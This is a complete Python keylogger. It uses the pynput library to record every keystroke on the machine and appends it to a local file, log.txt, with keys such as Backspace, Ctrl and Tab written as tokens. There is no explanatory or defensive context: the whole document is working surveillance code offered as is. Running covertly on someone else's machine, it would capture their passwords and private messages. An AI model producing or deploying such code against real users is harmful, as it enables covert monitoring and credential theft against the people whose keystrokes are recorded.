from pynput.keyboard import Listener

def writetofile(key):
    letter = str(key)
    letter = letter.replace("'", "")

    if letter == 'Key.space':
        letter = ' '
    if letter == 'Key.enter':
        letter = '\n'
    if letter == 'Key.shift_r' or letter == 'Key.shift_l':
        letter = ''
    if letter == 'Key.backspace':
        letter = '<BACKSPACE>'
    if letter == 'Key.tab':
        letter = '<TAB>'
    if letter == 'Key.ctrl_l' or letter == 'Key.ctrl_r':
        letter = '<CTRL>'
    if letter == 'Key.alt_l' or letter == 'Key.alt_r':
        letter = '<ALT>'
    if letter == 'Key.esc':
        letter = '<ESC>'
    if letter == 'Key.caps_lock':
        letter = '<CAPS_LOCK>'
    if letter == 'Key.cmd':
        letter = '<CMD>'
    with open('log.txt', 'a') as f:
        f.write(letter)

with Listener (on_press=writetofile) as l:
    l.join()